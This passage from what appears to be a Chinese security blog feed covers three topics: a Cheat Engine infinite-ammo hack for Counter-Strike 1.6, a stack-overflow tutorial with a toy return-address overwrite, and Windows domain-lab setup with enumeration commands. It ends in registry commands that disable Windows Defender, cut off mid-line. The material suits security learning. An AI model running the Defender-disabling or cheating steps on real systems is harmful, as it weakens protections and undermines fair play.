alt="image-20220320210354866"></p><p>可以看到地址是<strong>0AA49ADC</strong>并且偏移是7C，然后我们搜索得到3个绿色的基址</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/15.png" alt="image-20220320210534490"></p><p>通过断开游戏连接进行筛选只留下了这两个值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/16.png" alt="image-20220320210712347"></p><p>还需要继续筛选，我们直接退出游戏然后在重新启动后附加进CE，再进行验证，可以看到哪两个值一个变为空了，我们手动添加进行查看，这个<strong>cstrike.exe+D6E63C</strong>基址没有错</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/17.gif" alt="5"></p><p>然后我们只需要锁定他切换地图都可以无限子弹了，包括退出游戏后重新进入（重新开机不行）</p><h3 id="子弹区分敌我"><a href="#子弹区分敌我" class="headerlink" title="子弹区分敌我"></a>子弹区分敌我</h3><p>由于测试了重新开机是否能够继续发现不行，然后这些数据就是重新搜索的。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/18.png" alt="image-20220322213441976"></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/19.png" alt="image-20220322213506690"></p><p>我们可以看到我们锁定的数值在添加了BOT以后会无限的跳跃，而我们没有使用武器，并且队友都不需要切换弹药了（没录是因为录下来GIF太大了大家自行尝试）那么就可以断定这个值是代表所有人子弹的基址，我们就不能锁定它</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/20.gif" alt="1"></p><p>那我们换下一个基地在进行锁定</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/21.png" alt="image-20220323001430548"></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/22.png" alt="image-20220323001445649"></p><p>可以从图中看到机器人已经有了换弹夹的动作，而我们的子弹是无限的，并且数据没有乱跳，这就说明这个基址才是我们的子弹数</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CSGO/23.gif" alt="2"></p><p>后面测试换地图也是没有问题的</p><h3 id="CT表下载"><a href="#CT表下载" class="headerlink" title="CT表下载"></a>CT表下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.staticdn.net/Ascotbe/Image/master/CSGO/CSGO1.6-1.CT</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux栈溢出总结（0x00）</title>
    <link href="https://www.ascotbe.com/2022/02/22/StackOverflow_Linux_0x00/"/>
    <id>https://www.ascotbe.com/2022/02/22/StackOverflow_Linux_0x00/</id>
    <published>2022-02-22T10:45:42.000Z</published>
    <updated>2022-02-22T07:41:41.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>距离第一篇栈溢出学习文章已经过去了1年半了，今天看到一篇文章终于解决了之前的一些疑惑，也理清了很多东西，记录一下，原文地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/cmLp5aHfqy1-wYiNiqdq-Q</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/50.gif" alt="图片"></p><h2 id="什么是栈"><a href="#什么是栈" class="headerlink" title="什么是栈"></a>什么是栈</h2><p>简单来说，<code>栈</code> 是一种 <code>LIFO（Last In Frist Out，后进先出）</code> 形式的数据结构。栈一般是从高地址向低地址增长，并且栈支持 <code>push（入栈）</code> 和 <code>pop（出栈）</code> 两个操作。如下图所示：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/42.png" alt="图片"></p><p><code>push</code> 操作先将 <code>栈顶（sp指针）</code> 向下移动一个位置，然后将数据写入到新的栈顶；而 <code>pop</code> 操作会从 <code>栈顶</code> 读取数据，并且将 <code>栈顶（sp指针）</code> 向上移动一个位置。</p><p>例如，将 0x100 压入栈，过程如下图所示：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/43.png" alt="图片"></p><p>我们再来看看 <code>出栈</code> 操作，如下图所示：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/44.png" alt="图片"></p><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p><code>栈帧</code>，也就是 <code>Sack Frame</code>，其本质就是一种栈，只是这种栈专门用于保存函数调用过程中的各种信息（参数，返回地址，本地变量等）。</p><p><code>栈帧</code> 有 <code>栈顶</code> 和 <code>栈底</code> 之分，其中栈顶的地址最低，栈底的地址最高。SP(栈指针) 就是一直指向栈顶的。在 x86 的 32 位 CPU 中，我们用 <code>%ebp</code> 寄存器指向栈底，也就是基址指针；用 <code>%esp</code> 寄存器指向栈顶，也就是栈指针。下面是一个栈帧的示意图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/45.png" alt="图片"></p><p>一般来说，我们将 <code>%ebp</code> 到 <code>%esp</code> 之间区域当做栈帧。并不是整个栈空间只有一个栈帧，每调用一个函数，就会生成一个新的栈帧。</p><p>在函数调用过程中，我们将调用函数的函数称为：<code>调用者(caller)</code>，将被调用的函数称为：<code>被调用者(callee)</code>。在这个过程中：</p><ul><li><code>调用者</code> 需要知道在哪里获取 <code>被调用者</code> 返回的值（一般存放到 <code>%eax</code> 寄存器）。</li><li><code>被调用者</code> 需要知道传入的参数在哪里和调用完后的返回地址在哪里。</li><li>我们需要保证在 <code>被调用者</code> 返回后，<code>%ebp</code> 和 <code>%esp</code> 寄存器的值应该和调用前一致。</li></ul><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>现在，我们来看看函数调用时，栈帧是如何变化的。</p><p>我们以一个函数调用的实例来解说，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stack.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add_func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> c, d;</span><br><span class="line"></span><br><span class="line">    c = a;</span><br><span class="line">    d = b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c + d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> total;</span><br><span class="line"></span><br><span class="line">    total = add_func(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用命令 <code>gcc -S -m32 stack.c</code> 来编译上面的代码，获取的汇编代码如下所示（去掉一些无关紧要的信息）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add_func:</span><br><span class="line">    pushl   %ebp                // 保存ebp寄存器到栈</span><br><span class="line">    movl    %esp, %ebp          // 把ebp进程设置为esp的值</span><br><span class="line">    subl    $16, %esp           // 为局部变量申请空间</span><br><span class="line">    movl    8(%ebp), %eax       // 把参数a保存到eax寄存器中</span><br><span class="line">    movl    %eax, -8(%ebp)      // 把eax寄存器的值保存到局部变量c中（c = a）</span><br><span class="line">    movl    12(%ebp), %eax      // 把参数b保存到eax寄存器中</span><br><span class="line">    movl    %eax, -4(%ebp)      // 把eax寄存器到值保存到局部变量d中（d = b）</span><br><span class="line">    movl    -8(%ebp), %edx      // 把d的值保存到edx寄存器中</span><br><span class="line">    movl    -4(%ebp), %eax      // 把c的值保存到eax寄存器中</span><br><span class="line">    addl    %edx, %eax          // 将eax寄存器与edx寄存器的值相加，保存到eax中（返回值）</span><br><span class="line">    leave</span><br><span class="line">    ret                         // 函数返回</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>可能汇编代码比较难看懂，我们用下面的插图来说明这个调用过程：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/46.png" alt="图片"></p><p>如上图所示，调用过程如下：</p><ul><li>在 <code>main()</code> 函数调用 <code>add_func()</code> 函数前，先将调用 <code>add_func()</code> 函数的参数压栈。</li><li>在调用 <code>add_func()</code> 函数时，会将 <code>返回地址</code> 压栈，接着进入 <code>add_func()</code> 函数。</li><li><code>add_func()</code> 函数执行时，会将原来的 <code>ebp寄存器</code> 的值压栈，然后把 <code>ebp寄存器</code> 的设置为 <code>esp寄存器</code> 的值。</li><li>接着 <code>add_func()</code> 函数会为局部变量申请空间，也就是将 <code>esp寄存器</code> 向下移动。</li><li>然后把局部变量 <code>c</code> 设置为参数 <code>a</code> 的值，局部变量 <code>d</code> 设置为 参数 <code>b</code> 的值。</li><li>最后将局部变量 c 和 d 的值相加，放置到 <code>eax寄存器</code> 中（C语言规定以 <code>eax寄存器</code> 传递返回值），然后调用 <code>ret</code> 指令返回到 <code>main()</code> 函数。</li></ul><h2 id="函数返回"><a href="#函数返回" class="headerlink" title="函数返回"></a>函数返回</h2><p>上面介绍了 <code>函数调用</code> 的过程，现在我们来介绍一下函数调用完毕后，从被调用函数返回到原来的函数过程是如何处理的。</p><p>从 <code>add_func()</code> 函数的汇编代码可以看到，当被调用函数执行完毕返回到调用函数前，会执行 <code>leave</code> 指令，这条指令等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movl %ebp, %esp</span><br><span class="line">popl %ebp</span><br></pre></td></tr></table></figure><p>这两条汇编指令的意思是，将 <code>esp寄存器</code> 和 <code>ebp寄存器</code> 恢复到调用函数前的值。</p><p>然后，调用 <code>ret</code> 指令返回到原来的函数。<code>ret</code> 指令会从栈顶获取 <code>返回地址</code>，然后跳转到（<code>jmp指令</code>）此地址继续执行。这时的 <code>栈帧</code> 的结构如下图所示：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/47.png" alt="图片"></p><h2 id="栈溢出攻击"><a href="#栈溢出攻击" class="headerlink" title="栈溢出攻击"></a>栈溢出攻击</h2><p>前面说了那么，都是为了 <code>栈溢出攻击</code> 这节作铺垫的。通过前面的学习，我们知道调用函数的 <code>参数</code> 、执行完函数后的 <code>返回地址</code> 和被调用函数的 <code>局部变量</code> 都是存放在栈中的。</p><p>如果在调用函数时，不小心将 <code>返回地址</code> 覆盖了，那么调用完函数后，将不会跳转到原来的函数继续执行，而是跳转到覆盖后的地址执行。如下图所示：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/48.png" alt="图片"></p><p>那么，怎样才能把 <code>返回地址</code> 覆盖呢？我们可以通过下面的例子来说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR_SIZE 8   <span class="comment">// 指针的大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EBP_SIZE 8   <span class="comment">// ebp寄存器的大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inject_callback</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;inject_callback called...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func_call</span><span class="params">(<span class="type">char</span> *addr, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> tmpBuf[<span class="number">16</span>] = &#123;<span class="number">0xff</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">16</span> + EBP_SIZE, addr, len);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func_call called...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> injectPtr = (<span class="type">uint64_t</span>)&amp;inject_callback;</span><br><span class="line"></span><br><span class="line">    func_call(&amp;injectPtr, PTR_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main exited...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用以下命令编译上面代码，并且执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gcc stack-overflow.c -fno-stack-protector -o stack-overflow</span><br><span class="line">$ ./stack-overflow</span><br><span class="line">func_call called...</span><br><span class="line">inject_callback called...</span><br></pre></td></tr></table></figure><blockquote><p>在编译上面程序时，一定要加上 <code>-fno-stack-protector</code> 参数，否则将会触发栈溢出保护，导致执行失败。</p></blockquote><p>在上面的代码中，我们并没有直接调用 <code>inject_callback()</code> 函数，而是通过把 <code>inject_callback()</code> 函数的地址复制到 <code>func_call()</code> 函数的局部变量 <code>tmpBuf</code> 中。</p><p>由于局部变量 <code>tmpBuf</code> 的类型为字符串数组，而且大小为 16 个字节。但我们复制数据是从 24（16 + 8）处开始复制，已经超出了局部变量 <code>tmpBuf</code> 的大小，如下图所示：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/StackOverflow/49.png" alt="图片"></p><p>从上图可以看出，<code>func_call()</code> 函数在调用 <code>memcpy()</code> 函数复制数据时，由于不小心用 <code>inject_callback()</code> 函数的地址覆盖了返回地址，导致 <code>func_call()</code> 函数执行完毕后，跳转到 <code>inject_callback()</code> 函数处执行。</p><p>这就是 <code>栈溢出攻击</code> 的原理，而导致 <code>栈溢出攻击</code> 的原因就是：调用 <code>memcpy()</code>、<code>strcpy()</code> 等函数复制数据时，没有对数据的长度进行验证，从而 <code>返回地址</code> 被复制的数据覆盖了。</p><p>黑客可以利用 <code>栈溢出攻击</code> 来把函数的返回地址修改成入侵代码的地址，从而实现攻击的目的。</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Windows学习笔记</title>
    <link href="https://www.ascotbe.com/2021/12/01/WindowsStudyNotes/"/>
    <id>https://www.ascotbe.com/2021/12/01/WindowsStudyNotes/</id>
    <published>2021-12-01T15:58:53.000Z</published>
    <updated>2022-04-18T10:04:09.551Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p><del>不要问为什么没更新文章，在恶补英语所以没产出</del></p><p>之前关于红蓝对抗的文章是跟着其他文章学习的，现在看起来好乱，所以都删了改成这篇文章，主要还是记录自己的笔记，没有什么新技术</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/0.png" alt="image-20211201142629524"></p><h2 id="搭建域环境"><a href="#搭建域环境" class="headerlink" title="搭建域环境"></a>搭建域环境</h2><blockquote><p>环境清单</p></blockquote><p>由于我们需要域环境模拟常规的内网，所以搭建域环境</p><ul><li>Windows 2008 R2 X64</li><li>Windows 10</li><li>Windows 7 SP1 X64</li></ul><p>Windows需要执行<code>set-executionpolicy remotesigned</code>来打开默认不允许执行ps脚本</p><h3 id="配置静态IP"><a href="#配置静态IP" class="headerlink" title="配置静态IP"></a>配置静态IP</h3><p>位置：网络和共享中心-&gt;本地连接-&gt;属性-&gt;IPV4</p><p>然后需要设置一个DNS指向本机，因为它后面是一个域控的角色，IP地址可以在详细信息里面看，最好和现在类似。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/1.png" alt="image-20200729222159021"></p><h3 id="配置域环境"><a href="#配置域环境" class="headerlink" title="配置域环境"></a>配置域环境</h3><p>在服务管理器中添加角色</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/2.png" alt="image-20200729222459835"></p><p>然后勾选这个，这边提一句在创建域的时候还需要把当前用户设置为强密码</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/3.png" alt="image-20200729222546079"></p><p>然后就是无脑下一步安装，就可以安装成功了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/4.png" alt="image-20200729222646209"></p><p>接着我们点开角色位置</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/5.png" alt="image-20200729222814376"></p><p>会看到这个提示，我们只要点击蓝色的位置也就是<strong>dcpromo.exe</strong>就会出来这个页面</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/6.png" alt="image-20200729222917906"></p><p>点击下一步</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/7.png" alt="image-20200729223024238"></p><p>这边看了一下倾旋师傅写的<strong>Windows NT 4.0兼容的加密算法</strong>相关说明，这个算法是低版本的SMBv1客户端，在进行NTLM网络认证的过程中采用的算法较为简单，能够轻易破解，并且可能会受到Pass The Hash的技术手段利用、MS17-010等漏洞的危害，现在都是SMBv3的版本了</p><p>我们下一步</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/8.png" alt="image-20200729223717033"></p><p>这边选择<strong>新林</strong>，林表示多个域的集合，因为我们只有一个域所以这边用新的林。如果你设置了密码还是报错说你账户密码不符合要求的话就在命令行里面输入即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator /passwordreq:yes</span><br></pre></td></tr></table></figure><p>然后这边会要我们输入一个域名，我这边就填我博客的域名了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/9.png" alt="image-20200729225803364"></p><p>接着下一步可以看到，选择级别，我们直接选默认的2003</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/10.png" alt="image-20200729225859743"></p><p>一直下一步会弹出这个</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/11.png" alt="image-20200729230152688"></p><p>点击是</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/12.png" alt="image-20200729230236422"></p><p>然后设置DC管理员密码</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/13.png" alt="image-20200729230312638"></p><p>下一步后就能看到设置内容了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/14.png" alt="image-20200729230418827"></p><p>然后点击完成后重启，这边等就好了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/15.png" alt="image-20200729230456239"></p><p>重启后可以看到配置成功了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/16.png" alt="image-20200729231055590"></p><h3 id="加入于环境"><a href="#加入于环境" class="headerlink" title="加入于环境"></a>加入于环境</h3><p>接着我们打开准备好的Windows 10来ping下域IP是否能通</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/17.png" alt="image-20200729231256289"></p><p>然然后将当前主机的DNS服务器设置为DC的IP</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/18.png" alt="image-20200729231448959"></p><p>然后ping下我们的域</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/19.png" alt="image-20200729231549287"></p><p>接着找到系统属性</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/20.png" alt="image-20200729231932391"></p><p>点击网络</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/21.png" alt="image-20200729231951186"></p><p>点击下一步</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/22.png" alt="image-20200729232030994"></p><p>点击下一步，然后到这个页面，我们填上用户名，然后先不要点击下一步</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/23.png" alt="image-20200729234534909"></p><p>我们切换到windows 2008那台域控里面，新建一个用户</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/24.png" alt="image-20200729232339467"></p><p>然后填写用户名</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/25.png" alt="image-20200729234417477"></p><p>下一步后填写密码</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/26.png" alt="image-20200729232533961"></p><p>然后我们回到Windows 10，填上我们设置好的密码，和域名</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/27.png" alt="image-20200729234508295"></p><p>这边可能会报错说域不同，具体按上面写的信息来填就能到这一步</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/28.png" alt="image-20200729234734276"></p><p>然后点击下一步，选着<strong>Users</strong>权限</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/29.png" alt="image-20200729234817121"></p><p>下一步后重启完就行了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/30.png" alt="image-20200729234940152"></p><p>可以看到我们在域环境下并且能上网了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Windows/31.png" alt="image-20200729235153363"></p><h2 id="本地相关操作"><a href="#本地相关操作" class="headerlink" title="本地相关操作"></a>本地相关操作</h2><p>一些太基础的就不写了</p><h3 id="查看系统体系结构"><a href="#查看系统体系结构" class="headerlink" title="查看系统体系结构"></a>查看系统体系结构</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><h3 id="查询本机服务信息"><a href="#查询本机服务信息" class="headerlink" title="查询本机服务信息"></a>查询本机服务信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><h3 id="查询进程信息"><a href="#查询进程信息" class="headerlink" title="查询进程信息"></a>查询进程信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br><span class="line">wmic <span class="keyword">process</span> list brief</span><br></pre></td></tr></table></figure><h3 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST</span><br></pre></td></tr></table></figure><h3 id="查询用户信息"><a href="#查询用户信息" class="headerlink" title="查询用户信息"></a>查询用户信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user <span class="comment">#所有用户</span></span><br><span class="line">net user ascotbe <span class="comment">#指定用户</span></span><br><span class="line">net localgroup administrators <span class="comment">#查询本地管理员用户</span></span><br><span class="line">query user <span class="comment">#查询在线用户</span></span><br><span class="line">qwinsta    <span class="comment">#查询不在线用户</span></span><br></pre></td></tr></table></figure><h3 id="列出本地连接的会话"><a href="#列出本地连接的会话" class="headerlink" title="列出本地连接的会话"></a>列出本地连接的会话</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#需要管理员权限</span></span><br><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="查询本机共享"><a href="#查询本机共享" class="headerlink" title="查询本机共享"></a>查询本机共享</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><h3 id="查询远程连接端口"><a href="#查询远程连接端口" class="headerlink" title="查询远程连接端口"></a>查询远程连接端口</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /V PortNumber</span><br></pre></td></tr></table></figure><h3 id="关掉Defender"><a href="#关掉Defender" class="headerlink" title="关掉Defender"></a>关掉Defender</h3><h4 id="通过注册列表"><a href="#通过注册列表" class="headerlink" title="通过注册列表"></a>通过注册列表</h4><p><a href="https://docs.microsoft.com/fr-fr/powershell/module/defender/add-mppreference?view=win10-ps">微软文档</a></p><h5 id="需要重启的方式"><a href="#需要重启的方式" class="headerlink" title="需要重启的方式"></a>需要重启的方式</h5><p>原理就是在注册表中插入一个杀毒软件，让Defender以为我们装了杀软</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关闭defender</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> /v DisableAntiVirus /t reg_dword /d <span class="number">1</span> /f</span><br><span class="line"><span class="comment">#添加其他杀软到注册表</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Security 